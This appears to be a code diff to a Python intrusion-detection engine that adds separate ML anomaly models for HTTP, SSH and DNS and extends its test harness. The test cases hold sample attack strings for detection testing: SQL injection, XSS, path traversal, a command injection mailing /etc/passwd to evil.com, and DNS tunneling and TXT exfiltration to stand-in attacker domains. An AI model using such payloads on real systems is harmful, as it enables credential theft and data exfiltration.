@@ -30,14 +30,23 @@ class SentinelMLEngine:
         print("[INFO] Loading Rule-Based Filter (Layer 1)...")
         self.rule_filter = RuleBasedFilter()
         
-        # Layer 2: ML Anomaly Detector
-        print("[INFO] Loading ML Anomaly Detector (Layer 2)...")
-        try:
-            self.ml_detector = MLAnomalyDetector(model_path=config.MODEL_PATH)
-            print("[SUCCESS] Loaded pre-trained model")
-        except:
-            print("[WARNING] No pre-trained model found. Please run train_model.py first.")
-            self.ml_detector = None
+        # Layer 2: ML Anomaly Detectors (one per protocol)
+        print("[INFO] Loading ML Anomaly Detectors (Layer 2)...")
+        self.ml_detectors = {}
+        for protocol, filename in [
+            ("HTTP", "sentinel_model_http.pkl"),
+            ("SSH",  "sentinel_model_ssh.pkl"),
+            ("DNS",  "sentinel_model_dns.pkl"),
+        ]:
+            try:
+                detector = MLAnomalyDetector(protocol=protocol)
+                detector.load_model(filename=filename)
+                self.ml_detectors[protocol] = detector
+                print(f"[SUCCESS] Loaded pre-trained {protocol} model")
+            except Exception as e:
+                print(f"[WARNING] No pre-trained {protocol} model found.")
+                print(f"[WARNING] Run train_model.py to generate {filename}")
+                self.ml_detectors[protocol] = None
         
         # Layer 3: Sequence Analyzer
         print("[INFO] Initializing Sequence Analyzer (Layer 3)...")
@@ -97,9 +106,11 @@ class SentinelMLEngine:
             }
         
         # LAYER 2: ML Anomaly Detection (if rules passed)
+        # Route to the correct protocol model
         ml_result = None
-        if self.ml_detector and self.ml_detector.is_trained:
-            ml_result = self.ml_detector.predict(payload)
+        ml_detector = self.ml_detectors.get(protocol.upper())
+        if ml_detector and ml_detector.is_trained:
+            ml_result = ml_detector.predict(payload)
             
             if ml_result['is_malicious'] and ml_result['confidence'] > config.ANOMALY_SCORE_THRESHOLD:
                 # ML detected anomaly
@@ -115,6 +126,7 @@ class SentinelMLEngine:
                     'mitre_attack': self.rule_filter.map_to_mitre(payload),
                     'processing_time_ms': processing_time,
                     'ip_address': ip_address,
+                    'protocol': protocol,
                 }
         
         # LAYER 3: Sequence Analysis (check attack campaigns)
@@ -164,8 +176,10 @@ class SentinelMLEngine:
             }
         }
         
-        if self.ml_detector:
-            stats['ml_detector'] = self.ml_detector.get_stats()
+        # Per-protocol ML model stats
+        for protocol, detector in self.ml_detectors.items():
+            if detector:
+                stats[f'ml_detector_{protocol.lower()}'] = detector.get_stats()
         
         return stats
     
@@ -212,24 +226,39 @@ def test_mode(engine):
     print("="*80)
     
     test_cases = [
-        # (description, payload, ip_address)
-        ("Normal web request", "GET /index.html HTTP/1.1", "192.168.1.10"),
-        ("SQL Injection attempt", "admin' OR '1'='1'--", "10.0.0.50"),
-        ("XSS attack", "<script>alert('XSS')</script>", "10.0.0.50"),
-        ("Normal search query", "search?q=python tutorials", "192.168.1.11"),
-        ("Path traversal", "../../../../etc/passwd", "10.0.0.51"),
-        ("Command injection", "; cat /etc/passwd | mail hacker@evil.com", "10.0.0.52"),
-        ("Normal API call", "POST /api/users {name: 'John'}", "192.168.1.12"),
-        ("Obfuscated SQL", "ad'/**/OR/**/1=1--", "10.0.0.53"),
+        # (description, payload, ip_address, protocol)
+        # ── HTTP ──────────────────────────────────────────────────────────────
+        ("Normal web request",   "GET /index.html HTTP/1.1",                   "192.168.1.10", "HTTP"),
+        ("SQL Injection",        "admin' OR '1'='1'--",                        "10.0.0.50",    "HTTP"),
+        ("XSS attack",           "<script>alert('XSS')</script>",              "10.0.0.50",    "HTTP"),
+        ("Normal search query",  "search?q=python tutorials",                  "192.168.1.11", "HTTP"),
+        ("Path traversal",       "../../../../etc/passwd",                     "10.0.0.51",    "HTTP"),
+        ("Command injection",    "; cat /etc/passwd | mail hacker@evil.com",   "10.0.0.52",    "HTTP"),
+        ("Normal API call",      "POST /api/users {name: 'John'}",             "192.168.1.12", "HTTP"),
+        ("Obfuscated SQL",       "ad'/**/OR/**/1=1--",                         "10.0.0.53",    "HTTP"),
+
+        # ── SSH ───────────────────────────────────────────────────────────────
+        ("Normal SSH banner",    "SSH-2.0-OpenSSH_9.0",                        "192.168.1.20", "SSH"),
+        ("SSH brute force",      "root",                                        "10.0.0.60",    "SSH"),
+        ("SSH weak cipher",      "arcfour,blowfish-cbc,3des-cbc",              "10.0.0.61",    "SSH"),
+        ("SSH CVE exploit",      "libssh 0.7.3 authentication bypass",         "10.0.0.62",    "SSH"),
+        ("SSH tunneling",        "direct-tcpip 127.0.0.1 8080",               "10.0.0.63",    "SSH"),
+
+        # ── DNS ───────────────────────────────────────────────────────────────
+        ("Normal DNS query",     "www.google.com",                             "192.168.1.30", "DNS"),
+        ("DNS tunneling",        "aGVsbG8gd29ybGQ.tunnel.evil.com",           "10.0.0.70",    "DNS"),
+        ("DGA domain",           "xkqvzmnprt.ru",                             "10.0.0.71",    "DNS"),
+        ("DNS amplification",    "ANY isc.org",                               "10.0.0.72",    "DNS"),
+        ("DNS TXT exfil",        "TXT c3VwZXJzZWNyZXQ.exfil.attacker.com",   "10.0.0.73",    "DNS"),
     ]
     
-    for description, payload, ip in test_cases:
+    for description, payload, ip, protocol in test_cases:
         print(f"\n{'='*80}")
-        print(f"TEST: {description}")
+        print(f"TEST [{protocol}]: {description}")
         print(f"Payload: {payload}")
         print(f"Source IP: {ip}")
         
-        result = engine.analyze(payload, ip_address=ip)
+        result = engine.analyze(payload, ip_address=ip, protocol=protocol)
         engine.print_result(result)
         
         time.sleep(0.1)  # Small delay for readability
@@ -244,10 +273,12 @@ def test_mode(engine):
     for key, value in stats['rule_filter'].items():
         print(f"  {key}: {value}")
     
-    if 'ml_detector' in stats:
-        print("\nML Detector:")
-        for key, value in stats['ml_detector'].items():
-            print(f"  {key}: {value}")
+    for protocol in ['http', 'ssh', 'dns']:
+        key = f'ml_detector_{protocol}'
+        if key in stats:
+            print(f"\nML Detector ({protocol.upper()}):")
+            for k, v in stats[key].items():
+                print(f"  {k}: {v}")
     
     print(f"\nSequence Analyzer:")
     print(f"  Tracked IPs: {stats['sequence_analyzer']['tracked_ips']}")
@@ -261,8 +292,9 @@ def interactive_mode(engine):
     print("SENTINEL ML ENGINE v2.0 - INTERACTIVE MODE")
     print("="*80)
     print("\nEnter payloads to analyze (or 'quit' to exit)")
-    print("Format: <payload>")
-    print("Optional: <payload>|<ip_address>\n")
+    print("Format:   <payload>")
+    print("Optional: <payload>|<ip_address>|<protocol>")
+    print("Protocol: HTTP (default), SSH, DNS\n")
     
     while True:
         try:
@@ -274,17 +306,14 @@ def interactive_mode(engine):
             if not user_input:
                 continue
             
-            # Parse input
-            if '|' in user_input:
-                payload, ip = user_input.split('|', 1)
-                payload = payload.strip()
-                ip = ip.strip()
-            else:
-                payload = user_input
-                ip = "unknown"
+            # Parse input — support payload|ip|protocol format
+            parts = user_input.split('|')
+            payload  = parts[0].strip()
+            ip       = parts[1].strip() if len(parts) > 1 else "unknown"
+            protocol = parts[2].strip().upper() if len(parts) > 2 else "HTTP"
             
             # Analyze
-            result = engine.analyze(payload, ip_address=ip)
+            result = engine.analyze(payload, ip_address=ip, protocol=protocol)
             engine.print_result(result)
             
         except KeyboardInterrupt:
